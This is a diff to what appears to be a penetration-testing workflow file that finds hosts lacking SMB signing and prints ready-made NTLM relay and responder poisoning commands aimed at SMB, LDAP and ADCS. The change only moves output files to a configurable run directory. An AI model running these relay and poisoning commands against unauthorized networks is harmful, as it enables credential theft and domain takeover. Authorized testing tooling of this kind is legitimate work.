@@ -44,18 +44,18 @@ jobs:
         echo "[+] Checking SMB signing on {{ inputs.target }}..."
 
         if command -v nxc &>/dev/null; then
-          nxc smb {{ inputs.target }} --gen-relay-list /tmp/ofx_relay_targets.txt 2>/dev/null | tee /tmp/ofx_smb_signing.txt
+          nxc smb {{ inputs.target }} --gen-relay-list ${OFX_RUN_DIR:-/tmp}/ofx_relay_targets.txt 2>/dev/null | tee ${OFX_RUN_DIR:-/tmp}/ofx_smb_signing.txt
         elif command -v crackmapexec &>/dev/null; then
-          crackmapexec smb {{ inputs.target }} --gen-relay-list /tmp/ofx_relay_targets.txt 2>/dev/null | tee /tmp/ofx_smb_signing.txt
+          crackmapexec smb {{ inputs.target }} --gen-relay-list ${OFX_RUN_DIR:-/tmp}/ofx_relay_targets.txt 2>/dev/null | tee ${OFX_RUN_DIR:-/tmp}/ofx_smb_signing.txt
         else
           echo "[!] Neither nxc nor crackmapexec found"
-          nmap -p 445 --script smb2-security-mode -Pn {{ inputs.target }} 2>/dev/null | grep -E "signing|Host" | tee /tmp/ofx_smb_signing.txt
+          nmap -p 445 --script smb2-security-mode -Pn {{ inputs.target }} 2>/dev/null | grep -E "signing|Host" | tee ${OFX_RUN_DIR:-/tmp}/ofx_smb_signing.txt
         fi
 
-        if [ -f /tmp/ofx_relay_targets.txt ]; then
-          COUNT=$(wc -l < /tmp/ofx_relay_targets.txt)
+        if [ -f ${OFX_RUN_DIR:-/tmp}/ofx_relay_targets.txt ]; then
+          COUNT=$(wc -l < ${OFX_RUN_DIR:-/tmp}/ofx_relay_targets.txt)
           echo "relay_target_count=$COUNT" >> {{ env.OFX_OUTPUTS }}
-          echo "relay_targets_file=/tmp/ofx_relay_targets.txt" >> {{ env.OFX_OUTPUTS }}
+          echo "relay_targets_file=${OFX_RUN_DIR:-/tmp}/ofx_relay_targets.txt" >> {{ env.OFX_OUTPUTS }}
           echo "[+] $COUNT hosts without SMB signing (relay targets)"
         else
           echo "relay_target_count=0" >> {{ env.OFX_OUTPUTS }}
@@ -114,7 +114,7 @@ jobs:
 
         add_outputs(coercion_count=len(vectors))
         print(f"\n--- Relay Commands ---")
-        print(f"  ntlmrelayx: impacket-ntlmrelayx -tf /tmp/ofx_relay_targets.txt -smb2support")
+        print(f"  ntlmrelayx: impacket-ntlmrelayx -tf ${OFX_RUN_DIR:-/tmp}/ofx_relay_targets.txt -smb2support")
         print(f"  ntlmrelayx (LDAP): impacket-ntlmrelayx -t ldap://{dc} --delegate-access")
         print(f"  ntlmrelayx (ADCS): impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp --adcs")
         print(f"  responder: responder -I eth0 -wrfv")
@@ -139,5 +139,5 @@ jobs:
         echo "  Relay targets: {{ jobs['enum-signing'].outputs.relay_target_count | default('?', true) }}"
         echo "  Coercion vectors: {{ jobs['coercion-check'].outputs.coercion_count | default('?', true) }}"
         echo ""
-        echo "  Full target list: /tmp/ofx_relay_targets.txt"
+        echo "  Full target list: ${OFX_RUN_DIR:-/tmp}/ofx_relay_targets.txt"
       log-stdout: true
